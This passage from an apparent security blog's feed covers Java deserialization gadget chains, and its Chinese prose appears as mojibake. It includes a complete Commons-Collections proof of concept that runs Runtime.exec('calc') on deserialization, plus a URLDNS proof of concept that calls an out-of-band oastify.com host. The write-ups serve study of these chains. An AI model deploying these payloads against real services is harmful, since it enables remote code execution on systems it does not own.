å…¥ä¸€ä¸ªTransformerå¯¹è±¡ï¼Œç­‰putå®Œä¹‹åå†é€šè¿‡åå°„ä¿®æ”¹å›ChainedTransformerå¯¹è±¡ã€‚</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">lazymap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;1&quot;</span>));</span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap, <span class="string">&quot;2&quot;</span>);</span><br><span class="line">HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(); hashMap.put(tiedMapEntry, <span class="string">&quot;3&quot;</span>);</span><br></pre></td></tr></table></figure><p>åå°„ä¿®æ”¹lazymapçš„factoryçš„å€¼</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class; <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> lazyMapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>); factoryField.setAccessible(<span class="literal">true</span>); factoryField.set(lazymap, ct);</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨é“¾</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HashMap.readObject()</span><br><span class="line">HashMap.hash()</span><br><span class="line">    TiedMapEntry.hashCode()</span><br><span class="line">    TiedMapEntry.getValue()</span><br><span class="line">        LazyMap.get()</span><br><span class="line">            ChainedTransformer.transform()</span><br><span class="line">                InvokerTransformer.transform()</span><br><span class="line">                    Method.invoke()</span><br><span class="line">                        Runtime.exec()</span><br></pre></td></tr></table></figure><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;</span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">ct</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazymap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;1&quot;</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap, <span class="string">&quot;2&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry, <span class="string">&quot;3&quot;</span>);</span><br><span class="line"></span><br><span class="line">        lazymap.remove(<span class="string">&quot;2&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> lazyMapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(lazymap, ct);</span><br><span class="line"></span><br><span class="line">        serial(hashMap);</span><br><span class="line">        unserial();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serial</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc6.bin&quot;</span>));</span><br><span class="line">        out.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserial</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc6.bin&quot;</span>));</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;   ä¹‹å‰å¤ç°äº†java cc1é“¾å­ &lt;/p&gt;
&lt;p&gt;é¡ºä¾¿åœ¨è¿™è¿›è¡Œä¸€ä¸ªæ€»ç»“&lt;/p&gt;
&lt;h4 id=&quot;æ ¸å¿ƒæ­¦å™¨ï¼šåå°„ä¸‡èƒ½é’¥åŒ™ï¼ˆInvokerTransformerï¼‰&quot;&gt;&lt;a href=&quot;#æ ¸å¿ƒæ­¦å™¨ï¼šåå°„ä¸‡èƒ½é’¥åŒ™ï¼ˆInvokerTransformerï¼‰&quot; class=&quot;head</summary>
      
    
    
    
    <category term="java" scheme="https://gu0f3n.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://gu0f3n.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>URLDNS</title>
    <link href="https://gu0f3n.github.io/2025/03/23/URLDNS/"/>
    <id>https://gu0f3n.github.io/2025/03/23/URLDNS/</id>
    <published>2025-03-23T08:02:24.000Z</published>
    <updated>2025-03-23T09:00:44.345Z</updated>
    
    <content type="html"><![CDATA[<h1 id="URLDNS-é“¾å­åˆ†æ"><a href="#URLDNS-é“¾å­åˆ†æ" class="headerlink" title="URLDNS é“¾å­åˆ†æ"></a>URLDNS é“¾å­åˆ†æ</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*   Gadget Chain:</span><br><span class="line"> *     HashMap.readObject()</span><br><span class="line"> *       HashMap.putVal()</span><br><span class="line"> *         HashMap.hash()</span><br><span class="line"> *           URL.hashCode()</span><br></pre></td></tr></table></figure><p>åŸç†ï¼š</p><p><code>java.util.HashMap</code> é‡å†™äº† <code>readObject</code>, åœ¨ååºåˆ—åŒ–æ—¶ä¼šè°ƒç”¨ <code>hash</code> å‡½æ•°è®¡ç®— key çš„ hashCode.è€Œ <code>java.net.URL</code> çš„ hashCode åœ¨è®¡ç®—æ—¶ä¼šè°ƒç”¨ <code>getHostAddress</code> æ¥è§£æåŸŸå, ä»è€Œå‘å‡º DNS è¯·æ±‚.</p><p>åœ¨åˆ©ç”¨ysoç”Ÿæˆé“¾å­çš„æ—¶å€™å…ˆä»GeneratPayload.classè§¦å‘</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.PrintStream;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.Collections;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">import</span> java.util.LinkedList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.ObjectPayload;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.ObjectPayload.Utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GeneratePayload</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">INTERNAL_ERROR_CODE</span> <span class="operator">=</span> <span class="number">70</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">USAGE_CODE</span> <span class="operator">=</span> <span class="number">64</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">GeneratePayload</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (args.length != <span class="number">2</span>) &#123;</span><br><span class="line">            printUsage();</span><br><span class="line">            System.exit(<span class="number">64</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">payloadType</span> <span class="operator">=</span> args[<span class="number">0</span>];</span><br><span class="line">        <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> args[<span class="number">1</span>];</span><br><span class="line">        Class&lt;? <span class="keyword">extends</span> <span class="title class_">ObjectPayload</span>&gt; payloadClass = Utils.getPayloadClass(payloadType);</span><br><span class="line">        <span class="keyword">if</span> (payloadClass == <span class="literal">null</span>) &#123;</span><br><span class="line">            System.err.println(<span class="string">&quot;Invalid payload type &#x27;&quot;</span> + payloadType + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">            printUsage();</span><br><span class="line">            System.exit(<span class="number">64</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">ObjectPayload</span> <span class="variable">payload</span> <span class="operator">=</span> (ObjectPayload)payloadClass.newInstance();</span><br><span class="line">                <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> payload.getObject(command);</span><br><span class="line">                <span class="type">PrintStream</span> <span class="variable">out</span> <span class="operator">=</span> System.out;</span><br><span class="line">                Serializer.serialize(object, out);</span><br><span class="line">                Utils.releasePayload(payload, object);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable var7) &#123;</span><br><span class="line">                <span class="type">Throwable</span> <span class="variable">e</span> <span class="operator">=</span> var7;</span><br><span class="line">                System.err.println(<span class="string">&quot;Error while generating or serializing payload&quot;</span>);</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">                System.exit(<span class="number">70</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            System.exit(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br></pre></td></tr></table></figure><p>ç„¶åaddæ·»åŠ ä¹‹åï¼Œè°ƒç”¨æ–°å®ä¾‹åŒ–å¯¹è±¡çš„getObjectæ–¹æ³•,åé¢è°ƒè¯•è·³åˆ°äº†URLDNS.javaï¼Œä¸”å®ç°äº†ObjectPayloadæ¥å£ï¼Œé‡Œé¢ä¹Ÿç¡®å®æœ‰getObjectæ–¹æ³•ï¼š</p><p>é‡ç‚¹ä»£ç </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();<span class="comment">//åˆ›å»ºä¸€ä¸ªè¿”å›URLStreamHandleråä¸ºhandlerçš„å®ä¾‹SilentURLStreamHandler()</span></span><br><span class="line"><span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();<span class="comment">//åˆ›å»ºä¸€ä¸ªè¿”å›HashMapåä¸ºhtçš„å®ä¾‹HashMap()</span></span><br><span class="line"><span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>((URL)<span class="literal">null</span>, url, handler);<span class="comment">//åˆ›å»ºä¸€ä¸ªè¿”å›URLåå­—ä¸ºuçš„å®åŠ›URL,å¹¶ä¸”ä½¿ç”¨æŒ‡å®šæ„é€ å‡½æ•°URL(URL context, String spec, URLStreamHandler handler)</span></span><br><span class="line">ht.put(u, url);<span class="comment">//è¿™ä¸€è¡Œå°† URL å¯¹è±¡ u å’Œå¯¹åº”çš„ url å­—ç¬¦ä¸²å­˜å…¥ HashMap ht</span></span><br><span class="line">Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>);<span class="comment">//è¿™ä¸€è¡Œé€šè¿‡åå°„æœºåˆ¶å°† URL å¯¹è±¡ u çš„ hashCode å­—æ®µå€¼è®¾ç½®ä¸º -1ï¼ˆå› ä¸º -1 é€šå¸¸è¡¨ç¤ºæœªåˆå§‹åŒ–çš„çŠ¶æ€ï¼‰</span></span><br><span class="line"><span class="keyword">return</span> ht;<span class="comment">//è¿”å›å€¼ht</span></span><br></pre></td></tr></table></figure><p>URLStreamHandler æ˜¯ Java ä¸­çš„ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œç”¨äºå¤„ç† URL çš„åè®®éƒ¨åˆ†ï¼Œä¾‹å¦‚ HTTPã€HTTPSã€FTP ç­‰ã€‚</p><p>HashMap æ˜¯ Java ä¸­çš„ä¸€ç§é›†åˆç±»ï¼Œå±äº java.util åŒ…ï¼Œç”¨äºå­˜å‚¨é”®å€¼å¯¹ï¼ˆkey-value pairsï¼‰ã€‚</p><p>åœ¨è¿™é‡Œï¼Œht æ˜¯ä¸€ä¸ªç©ºçš„ HashMapï¼Œåç»­å°†è¢«ç”¨æ¥å­˜å‚¨ URL å¯¹è±¡å’Œå¯¹åº”çš„ URL å­—ç¬¦ä¸²ã€‚</p><p>Reflections å¯èƒ½æ˜¯ä¸€ä¸ªå·¥å…·ç±»ï¼ˆä¾‹å¦‚æ¥è‡ªæŸä¸ªåº“ï¼Œå¦‚ org.reflectionsï¼‰ï¼Œç”¨äºç®€åŒ– Java åå°„æ“ä½œã€‚å®ƒçš„ setFieldValue æ–¹æ³•é€šè¿‡åå°„ä¿®æ”¹å¯¹è±¡çš„å­—æ®µå€¼ã€‚</p><p>åœ¨ Java çš„ URL ç±»ä¸­ï¼ŒhashCode æ˜¯ä¸€ä¸ªç§æœ‰å­—æ®µï¼Œç”¨äºç¼“å­˜è¯¥ URL çš„å“ˆå¸Œç ã€‚URL ç±»çš„ hashCode() æ–¹æ³•ä¼šè®¡ç®—å¹¶ç¼“å­˜è¿™ä¸ªå€¼ï¼Œä»¥ä¾¿åœ¨é›†åˆæ“ä½œï¼ˆå¦‚ HashMap çš„é”®æ¯”è¾ƒï¼‰ä¸­å¿«é€Ÿä½¿ç”¨ã€‚</p><p>å°† hashCode è®¾ç½®ä¸º -1 çš„ç›®çš„å¯èƒ½æ˜¯ï¼š</p><ul><li>å¼ºåˆ¶ URL å¯¹è±¡åœ¨ä¸‹æ¬¡è°ƒç”¨ hashCode() æ—¶é‡æ–°è®¡ç®—å“ˆå¸Œç ï¼ˆå› ä¸º -1 é€šå¸¸è¡¨ç¤ºæœªåˆå§‹åŒ–çš„çŠ¶æ€ï¼‰ã€‚</li></ul><p>hashcodeè®¡ç®—ï¼Œåˆ¤æ–­å¦‚æœä¸æ˜¯-1ï¼Œåˆ™ç›´æ¥è¿”å›ï¼Œè¡¨ç¤ºå·²ç»ç®—è¿‡äº†ï¼Œæ˜¯-1åˆ™ç»§ç»­è®¡ç®—ï¼›è¿˜æœ‰éœ€è¦æ³¨æ„çš„è¿™ä¸ªæ¥å£ä¸­ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">transient</span> URLStreamHandler handler; <span class="comment">//è¿™ä¸ªURLä¼ è¾“å®ç°ç±»æ˜¯ä¸€ä¸ªtransientä¸´æ—¶ç±»å‹ï¼Œå®ƒä¸ä¼šè¢«ååºåˆ—åŒ– </span></span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span> <span class="variable">hashCode</span> <span class="operator">=</span> -<span class="number">1</span>;<span class="comment">//hashCodeæ˜¯privateç±»å‹ï¼Œéœ€è¦æ‰‹åŠ¨å¼€æ”¾æ§åˆ¶æƒæ‰å¯ä»¥ä¿®æ”¹ã€‚</span></span><br></pre></td></tr></table></figure><p>é¦–å…ˆè°ƒç”¨HashMapçš„putæ–¹æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¼šé€šè¿‡hashå‡½æ•°è°ƒç”¨<code>key.hashCode()</code>è®¡ç®—keyçš„hashCode;</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>keyæ˜¯ä¼ å…¥çš„URLå¯¹è±¡ï¼Œæœ€ç»ˆè°ƒç”¨URLå¯¹è±¡çš„hashCodeå‡½æ•°ï¼Œ</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">    hashCode = handler.hashCode(<span class="built_in">this</span>);</span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>handler</code>æ˜¯<code>URLStreamHandler</code>çš„å¯¹è±¡ï¼›handleråœ¨æ„é€ å‡½æ•°æ—¶è¢«èµ‹å€¼äº†</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">transient</span> URLStreamHandler handler</span><br></pre></td></tr></table></figure><p>æ¥ç€è°ƒç”¨äº†<code>URLStreamHandler.hashCode</code>ä¸­çš„<code>getHostAddress(u)</code>æ–¹æ³•å¯¼è‡´DNSè§£æ</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">InetAddress</span> <span class="variable">addr</span> <span class="operator">=</span> getHostAddress(u);</span><br><span class="line"><span class="keyword">if</span> (addr != <span class="literal">null</span>) &#123;</span><br><span class="line">    h += addr.hashCode();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> u.getHost();</span><br><span class="line">    <span class="keyword">if</span> (host != <span class="literal">null</span>)</span><br><span class="line">        h += host.toLowerCase().hashCode();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>POC</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">urldns</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;</span><br><span class="line">        HashMap&lt;URL, Integer&gt; hashmap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL, Integer&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://5msdqvjsda7s3f8m8h0vkcsmgdm4avyk.oastify.com&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> url.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashcodefield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashcodefield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashcodefield.set(url,<span class="number">2</span>); <span class="comment">//ä¸ºäº†é˜²æ­¢åœ¨putæ—¶å°±å‘èµ·DNSè¯·æ±‚ï¼Œå°†hashCodeçš„é»˜è®¤å€¼-1æ”¹æ‰ï¼Œæ‰§è¡Œä¸äº†handler.hashCode(this)</span></span><br><span class="line"></span><br><span class="line">        hashmap.put(url, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        hashcodefield.set(url,-<span class="number">1</span>);</span><br><span class="line">        serialize(hashmap);</span><br><span class="line">        unserialize();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ€»ç»“ </p><p>å½¢è±¡çš„ä¸¾ä¸ªä¾‹å­</p><h3 id="åŸ‹é›·ï¼šæ„é€ ä¸€ä¸ªå¸¦â€œé™·é˜±â€çš„å¿«é€’ï¼ˆåºåˆ—åŒ–ï¼‰"><a href="#åŸ‹é›·ï¼šæ„é€ ä¸€ä¸ªå¸¦â€œé™·é˜±â€çš„å¿«é€’ï¼ˆåºåˆ—åŒ–ï¼‰" class="headerlink" title="åŸ‹é›·ï¼šæ„é€ ä¸€ä¸ªå¸¦â€œé™·é˜±â€çš„å¿«é€’ï¼ˆåºåˆ—åŒ–ï¼‰"></a><strong>åŸ‹é›·ï¼šæ„é€ ä¸€ä¸ªå¸¦â€œé™·é˜±â€çš„å¿«é€’ï¼ˆåºåˆ—åŒ–ï¼‰</strong></h3><ul><li><strong>é™·é˜±æ ¸å¿ƒ</strong>ï¼šæŠŠURLå¯¹è±¡ï¼ˆæ¯”å¦‚<code>http://xxx.dnslog.cn</code>ï¼‰å¡è¿›HashMapé‡Œå½“â€œé’¥åŒ™â€ï¼ˆKeyï¼‰ï¼Œç„¶ååºåˆ—åŒ–è¿™ä¸ªHashMapã€‚</li></ul><p><strong>é˜²æ­¢æå‰è§¦å‘</strong>ï¼šURLå¯¹è±¡é»˜è®¤ä¼šç«‹å³æŸ¥DNSï¼Œä½†é»‘å®¢ç”¨åå°„ä¿®æ”¹<code>hashCode</code>å±æ€§ä¸º123ï¼ˆä¸´æ—¶å€¼ï¼‰ï¼Œé¿å…åºåˆ—åŒ–æ—¶è§¦å‘DNS</p><h3 id="å¯„å¿«é€’ï¼šå‘é€åŒ…è£¹åˆ°ç›®æ ‡ï¼ˆä¼ è¾“æ•°æ®ï¼‰"><a href="#å¯„å¿«é€’ï¼šå‘é€åŒ…è£¹åˆ°ç›®æ ‡ï¼ˆä¼ è¾“æ•°æ®ï¼‰" class="headerlink" title="å¯„å¿«é€’ï¼šå‘é€åŒ…è£¹åˆ°ç›®æ ‡ï¼ˆä¼ è¾“æ•°æ®ï¼‰"></a><strong>å¯„å¿«é€’ï¼šå‘é€åŒ…è£¹åˆ°ç›®æ ‡ï¼ˆä¼ è¾“æ•°æ®ï¼‰</strong></h3><ul><li><strong>æ•°æ®ä¼ªè£…</strong>ï¼šåºåˆ—åŒ–åçš„HashMapçœ‹èµ·æ¥æ˜¯æ™®é€šæ•°æ®ï¼Œè¢«å‘é€åˆ°ç›®æ ‡æœåŠ¡å™¨ï¼ˆæ¯”å¦‚é€šè¿‡æ¥å£ã€æ–‡ä»¶ä¸Šä¼ ç­‰é€”å¾„ï¼‰ã€‚</li></ul><h3 id="æ‹†å¿«é€’ï¼šç›®æ ‡æ‹†åŒ…è£¹è§¦å‘é™·é˜±ï¼ˆååºåˆ—åŒ–ï¼‰"><a href="#æ‹†å¿«é€’ï¼šç›®æ ‡æ‹†åŒ…è£¹è§¦å‘é™·é˜±ï¼ˆååºåˆ—åŒ–ï¼‰" class="headerlink" title="æ‹†å¿«é€’ï¼šç›®æ ‡æ‹†åŒ…è£¹è§¦å‘é™·é˜±ï¼ˆååºåˆ—åŒ–ï¼‰"></a><strong>æ‹†å¿«é€’ï¼šç›®æ ‡æ‹†åŒ…è£¹è§¦å‘é™·é˜±ï¼ˆååºåˆ—åŒ–ï¼‰</strong></h3><p><strong>è‡ªåŠ¨æ‹†åŒ…</strong>ï¼šæœåŠ¡å™¨ååºåˆ—åŒ–æ—¶ï¼Œä¼šè°ƒç”¨HashMapçš„<code>readObject</code>æ–¹æ³•ï¼Œè¿™æ˜¯Javaé»˜è®¤çš„ååºåˆ—åŒ–é€»è¾‘ã€‚</p><p><strong>è®¡ç®—â€œé’¥åŒ™â€å“ˆå¸Œå€¼</strong>ï¼š</p><p>HashMapä¼šé‡æ–°è®¡ç®—æ¯ä¸ªKeyçš„å“ˆå¸Œå€¼ï¼ˆ<code>hash(key)</code>ï¼‰</p><ul><li>æ­¤æ—¶Keyæ˜¯ä¹‹å‰åŸ‹å…¥çš„URLå¯¹è±¡ï¼Œäºæ˜¯è°ƒç”¨URLçš„<code>hashCode()</code>æ–¹æ³•ã€‚</li></ul><h3 id="æŸ¥åœ°å€ï¼šè§¦å‘DNSè¯·æ±‚ï¼ˆæ ¸å¿ƒåˆ©ç”¨ï¼‰"><a href="#æŸ¥åœ°å€ï¼šè§¦å‘DNSè¯·æ±‚ï¼ˆæ ¸å¿ƒåˆ©ç”¨ï¼‰" class="headerlink" title="æŸ¥åœ°å€ï¼šè§¦å‘DNSè¯·æ±‚ï¼ˆæ ¸å¿ƒåˆ©ç”¨ï¼‰"></a><strong>æŸ¥åœ°å€ï¼šè§¦å‘DNSè¯·æ±‚ï¼ˆæ 